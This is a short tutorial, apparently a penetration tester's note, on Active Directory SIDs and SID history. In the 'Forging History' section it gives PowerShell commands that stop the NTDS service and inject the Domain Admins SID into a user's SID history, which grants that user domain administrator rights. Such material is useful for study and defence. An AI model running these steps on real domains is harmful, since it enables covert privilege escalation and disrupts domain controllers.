> SID in AD

In an Active Directory (AD) environment, a Security Identifier (SID) is a unique identifier used to manage security principals like users, groups, and computer accounts. SIDs are crucial for controlling access to resources and for maintaining security in a Windows environment.

> SID History

When an organization migrates from one domain to another, SID history allows users to retain access to resources in the old domain while they are gradually transitioned to the new domain. 

**Forging History**

The goal here is fetch the SID of any admin groups to add this SID to our SID history.
Before we start we need to make sure our account does not have any information in their SID history:
```
PS C:\> Get-ADUser <your ad username> -properties sidhistory,memberof
```
Let's get the SID of the Domain Admins group since this is the group we want to add to our SID History:
```
Get-ADGroup "Domain Admins"
```
then:
```
Stop-Service -Name ntds -force 
Add-ADDBSidHistory -SamAccountName 'our username' -SidHistory 'SID of domain admin for example' -DatabasePath C:\Windows\NTDS\ntds.dit 
Start-Service -Name ntds 
```
Now we become member of the domain admins group
> note

This attack need administrative access to perform.








